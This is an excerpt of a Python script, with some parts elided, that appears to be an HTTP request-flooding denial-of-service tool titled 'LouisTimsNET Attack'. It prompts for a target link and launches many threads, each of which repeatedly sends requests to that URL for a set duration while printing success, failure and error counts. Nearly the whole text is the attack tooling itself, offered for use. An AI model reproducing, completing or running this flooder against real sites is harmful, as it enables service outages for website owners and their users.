...
def update_title(pps, requests_per_seconds):
    title = f"HTTP-REQUESTS | LouisTimsNET Attack Sent | PPS: {pps} | RQS: {requests_per_seconds}"
    if os.name == 'nt':
        os.system(f'title {title}')

def worker(url, duration, reqs_per_cycle):
    session = requests.Session()
    end_time = time.time() + duration
    success, failed, server_error, other_status = 0, 0, 0, 0
    ...
    while time.time() < end_time:
        ...
        update_title(int(pps), reqs_per_cycle)

        print(
            f"{Fore.GREEN}[+] OK: {success} | "
            f"{Fore.YELLOW}Other: {other_status} | "
            f"{Fore.RED}500: {server_error} | "
            f"{Fore.MAGENTA}Fail: {failed}{Style.RESET_ALL}"
        )

        success = failed = server_error = other_status = 0
        time.sleep(1)
...
""")
    url = input(f"{Fore.RED}Enter Link Please: {Style.RESET_ALL}").strip()
    ...
    for _ in range(threads_count):
        t = threading.Thread(target=worker, args=(url, duration, reqs_per_cycle))
        threads.append(t)
        t.start()
